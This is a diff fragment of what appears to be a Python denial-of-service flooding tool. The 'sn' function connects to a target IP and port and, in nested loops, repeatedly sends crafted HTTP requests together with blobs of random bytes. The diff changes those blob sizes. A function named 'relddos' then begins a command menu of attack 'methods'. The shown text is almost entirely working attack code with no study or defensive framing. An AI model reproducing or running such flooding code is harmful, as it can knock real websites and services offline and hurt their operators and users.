@@ -399,23 +399,23 @@ def sn():
   request  = get_host + connection + referer + content + length + "\r\n"
   s.connect((ip,port))
   for x in range(lo):
-     s.send(random._urandom(50411))
+     s.send(random._urandom(1024))
      s.sendall(str.encode(request))
-     s.send(random._urandom(50411))
-     s.send(random._urandom(50411))
+     s.send(random._urandom(1024))
+     s.send(random._urandom(7091))
      s.sendall(str.encode(request))
-     s.send(random._urandom(50411))
+     s.send(random._urandom(1024))
      s.sendall(str.encode(request))
-     s.send(random._urandom(50411))
+     s.send(random._urandom(90024))
      for x in range(lo):
-               s.send(random._urandom(50411))
+               s.send(random._urandom(5041))
                s.sendall(str.encode(request))
-               s.send(random._urandom(50411))
-               s.send(random._urandom(50411))
+               s.send(random._urandom(5041))
+               s.send(random._urandom(5041))
                s.sendall(str.encode(request))
-               s.send(random._urandom(50411))
+               s.send(random._urandom(5041))
                s.sendall(str.encode(request))
-               s.send(random._urandom(50411))
+               s.send(random._urandom(5041))
 def relddos():
    command = str(input("command :"))
    if command == "methods" or command == "METHODS":
